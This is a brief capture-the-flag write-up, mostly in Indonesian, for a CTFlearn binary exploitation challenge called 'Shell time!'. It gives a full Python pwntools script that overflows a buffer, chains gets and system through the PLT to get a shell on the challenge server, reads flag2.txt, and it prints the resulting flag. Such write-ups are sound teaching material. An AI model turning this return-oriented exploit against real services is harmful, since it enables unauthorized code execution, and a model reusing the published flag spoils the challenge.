# Shell time! (40 Points)
(Continued from RIP my bof)
<br>
Can you also get a shell? The flag is at /flag2.txt.
<br>
Hint: you do not need libc for this challenge.
<br>
nc thekidofarcrania.com 4902
# Solved
Disini memiliki fungsi <b>system</b> dan <b>gets</b>
```python
gets_plt = struct.pack("<I", (server.plt[b'gets']))
system_plt = struct.pack("<I", (server.plt[b'system']))
```
Yang bisa fungsikan menjadi shell-code, inilah code yang saya gunakan untuk mendapatkan flag
```python
from pwn import *
import struct

BUFF = 60

server = ELF("server")

gets_plt = struct.pack("<I", (server.plt[b'gets']))
system_plt = struct.pack("<I", (server.plt[b'system']))
pop_ebx = struct.pack("<I", (0x080483c9))
bss = 0x804a0a1

r = remote("thekidofarcrania.com", 4902)

payload = flat(["A" * BUFF, gets_plt, pop_ebx, bss, system_plt, 0xdeadbeef, bss])

r.recvuntil("Legend")
r.send(payload + b"\n")
r.recv()

# dir
# $ dir
# bin   dev  flag.txt   home  lib64  mnt    proc  run   server  sys  usr
# boot  etc  flag2.txt  lib   media  opt    root  sbin  srv     tmp  var

r.sendline("cat flag2.txt")
r.interactive()
```
Flag : <b>CTFlearn{c0ngrat1s_0n_th1s_sh3ll!_SKDJLSejf}</b>